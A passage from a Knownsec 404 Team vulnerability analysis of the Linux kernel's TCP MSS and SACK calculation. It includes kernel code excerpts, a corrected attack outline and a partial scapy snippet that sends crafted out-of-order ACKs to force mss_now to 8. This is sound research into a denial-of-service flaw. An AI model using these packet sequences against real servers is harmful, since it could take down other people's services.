@@ -1,0 +1,172 @@
+        __be32  seq;
+        __be32  ack_seq;
+    #if defined(__LITTLE_ENDIAN_BITFIELD)
+        __u16   res1:4,
+            doff:4,
+            fin:1,
+            syn:1,
+            rst:1,
+            psh:1,
+            ack:1,
+            urg:1,
+            ece:1,
+            cwr:1;
+    #elif defined(__BIG_ENDIAN_BITFIELD)
+        __u16   doff:4,
+            res1:4,
+            cwr:1,
+            ece:1,
+            urg:1,
+            ack:1,
+            psh:1,
+            rst:1,
+            syn:1,
+            fin:1;
+    #else
+    #error  "Adjust your  defines"
+    #endif  
+        __be16  window;
+        __sum16 check;
+        __be16  urg_ptr;
+    };
+This structure is a 20-byte TCP fixed protocol header.
+The variable `tcp_sk(sk)->tcp_header_len` indicates the length of the TCP
+packet header sent by the local machine.
+Therefore, we can get the formula for calculating `mss_now`: the MSS value set
+by the SYN packet - (The length of the TCP packet header sent by the local
+machine - the fixed length of the TCP header is 20 bytes)
+So, if the value of `tcp_header_len` can reach a maximum of 60, then `mss_now`
+can be set to 8. So in the kernel code, is there any way to make
+`tcp_header_len` reach the maximum length? Then we backtrack this variable:
+    # tcp_output.c
+    tcp_connect_init:
+    tp->tcp_header_len = sizeof(struct tcphdr);
+        if (sock_net(sk)->ipv4.sysctl_tcp_timestamps)
+            tp->tcp_header_len += TCPOLEN_TSTAMP_ALIGNED;
+    #ifdef CONFIG_TCP_MD5SIG
+        if (tp->af_specific->md5_lookup(sk, sk))
+            tp->tcp_header_len += TCPOLEN_MD5SIG_ALIGNED;
+    #endif
+Therefore, in the Linux 4.15 kernel, the kernel does not send TCP packets with
+a header size of 60 bytes without user intervention, which resulted in that
+the MSS cannot be set to a minimum of 8, thus ultimately prevented the
+vulnerability from being exploited.
+# Summary
+Let's summarize the whole process:
+  1. Attacker constructs a SYN packet, and the optional TCP header optional parameter has a value of 48 for the MSS.
+  2. After the Target(vulnerable devices) receives the SYN request, it saves the data in the SYN packet in the memory and returns to the 'SYN" and the "ACK' packets.
+  3. Attacker returns an ACK packet.
+Complete the 3-way handshake process.
+Then according to different services, the target actively sends data to the
+attacker or sends the data to the attacker after receiving the attacker
+request. Here, it is assumed to be an Nginx HTTP service.
+~~1\. The attacker sends a request to the target:`GET / HTTP/1.1`.~~
+~~2\. After receiving the request, the target firstly calculates
+tcp_header_len, which is equal to 20 bytes by default. When the kernel
+parameters sysctl_tcp_timestamps is enabled, 12 bytes are added. If you
+selected CONFIG_TCP_MD5SIG when compiling the kernel, another 18 bytes will be
+added, which means that the maximum length of tcp_header_len is 50 bytes.~~
+~~3\. Then you will calculate mss_now = 48 - 50 + 20 = 18~~
+~~It is assumed that the vulnerability might be exploited successfully under
+such circumstances: there is a TCP service that sets the TCP optional
+parameters to the full 40 bytes, then it is possible for an attacker to
+perform a Dos attack on the service by constructing the MSS value in the SYN
+packet.~~
+~~I audited the Linux kernel from 2.6.29 to the present version, and the
+calculation formula of mss_now is the same. The length of tcp_header_len will
+only add 12 bytes of the timestamp and 18 bytes of the md5 value.~~
+\----- 2019/07/03 UPDATE -----
+Thanks for @riatre to correct me. I found that the above analysis of the
+tcp_current_mss function had missed an important piece of code:
+    # tcp_output.c
+    tcp_current_mss -> tcp_sync_mss:
+    mss_now = tcp_mtu_to_mss(sk, pmtu);
+    header_len = tcp_established_options(sk, NULL, &opts, &md5) + 
+                sizeof(struct tcphdr);
+    if (header_len != tp->tcp_header_len) {
+        int delta = (int) header_len - tp->tcp_header_len;
+        mss_now -= delta;
+    }
+In the code of the `tcp_established_options` function, apart from the 12-byte
+timestamp and the 20-byte md5, there is still the calculation of the SACK
+length. If the length does not exceed the 40-byte limit of the tcp option, the
+formula is: `Size = 4 + 8 * opts->num_sack_blocks`.
+    eff_sacks = tp->rx_opt.num_sacks + tp->rx_opt.dsack;
+    if (unlikely(eff_sacks)) {
+        const unsigned int remaining = MAX_TCP_OPTION_SPACE - size;
+        opts->num_sack_blocks =
+            min_t(unsigned int, eff_sacks,
+                  (remaining - TCPOLEN_SACK_BASE_ALIGNED) /
+                  TCPOLEN_SACK_PERBLOCK);
+        size += TCPOLEN_SACK_BASE_ALIGNED +
+            opts->num_sack_blocks * TCPOLEN_SACK_PERBLOCK;
+    }
+So the method of getting 40 bytes tcp options is: `12-byte timestamp + 8 * 3
+(opts->num_sack_blocks)`.
+The variable `opts->num_sack_blocks` indicates the number of packets lost from
+the peer.
+So here the process of the last three steps in the summary are modified as
+follows:
+The attacker sends a normal HTTP request to the drone.
+After receiving the request, the target will send a HTTP response packet. As
+shown in the screenshot above, the response packet will be divided into
+multiple segments according to the length of 36 bytes.
+The attacker constructs a serial queue with a missing ACK packet (the ACK
+packet needs to carry some data).
+After receiving the unordered ACK packet, the server finds that packet loss
+has occurred. Therefore, in the subsequent data packet, the SACK option is
+brought to tell the client that those packets are lost until the TCP link is
+disconnected or a packet receives a response sequence.
+Results are shown below:
+Because the timestamp is counted, the TCP SACK option can only contain up to 3
+sequence numbers, so you can set the MSS to 8 by sending 4 ACK packets.
+Part of the scapy code is as follows:
+    data = "GET / HTTP/1.1\nHost: 192.168.11.112\r\n\r\n"
+    ACK = TCP(sport=sport, dport=dport, flags='A', seq=SYNACK.ack, ack=SYNACK.seq+1)
+    ACK.options = [("NOP",None), ("NOP",None), ('Timestamp', (1, 2))]
+    send(ip/ACK/data)
+    dl = len(data)
+    test = "a"*10
+    ACK.seq += dl + 20
+    ACK.ack = SYNACK.seq+73
+    send(ip/ACK/test)
+    ACK.seq += 30
+    ACK.ack = SYNACK.seq+181
+    send(ip/ACK/test)
+    ACK.seq += 30
+    ACK.ack = SYNACK.seq+253
+    send(ip/ACK/test)
+Now having satisfied the premise of mss_now=8, I will conduct futher analysis
+to the vulnerability.
+# 参考
+  1. 
+  2. 
+  3. 
+# About Knownsec & 404 Team
+Beijing Knownsec Information Technology Co., Ltd. was established by a group
+of high-profile international security experts. It has over a hundred frontier
+security talents nationwide as the core security research team to provide
+long-term internationally advanced network security solutions for the
+government and enterprises.
+Knownsec's specialties include network attack and defense integrated
+technologies and product R&D under new situations. It provides visualization
+solutions that meet the world-class security technology standards and enhances
+the security monitoring, alarm and defense abilities of customer networks with
+its industry-leading capabilities in cloud computing and big data processing.
+The company's technical strength is strongly recognized by the State Ministry
+of Public Security, the Central Government Procurement Center, the Ministry of
+Industry and Information Technology (MIIT), China National Vulnerability
+Database of Information Security (CNNVD), the Central Bank, the Hong Kong
+Jockey Club, Microsoft, Zhejiang Satellite TV and other well-known clients.
+404 Team, the core security team of Knownsec, is dedicated to the research of
+security vulnerability and offensive and defensive technology in the fields of
+Web, IoT, industrial control, blockchain, etc. 404 team has submitted
+vulnerability research to many well-known vendors such as Microsoft, Apple,
+Adobe, Tencent, Alibaba, Baidu, etc. And has received a high reputation in the
+industry.
+The most well-known sharing of Knownsec 404 Team includes: [KCon Hacking
+Conference](http://kcon.knownsec.com/#/ "KCon Hacking Conference"), [Seebug
+Vulnerability Database](https://www.seebug.org/ "Seebug Vulnerability
+Database") and [ZoomEye Cyberspace Search Engine](https://www.zoomeye.org/
+"ZoomEye Cyberspace Search Engine").
+* * *
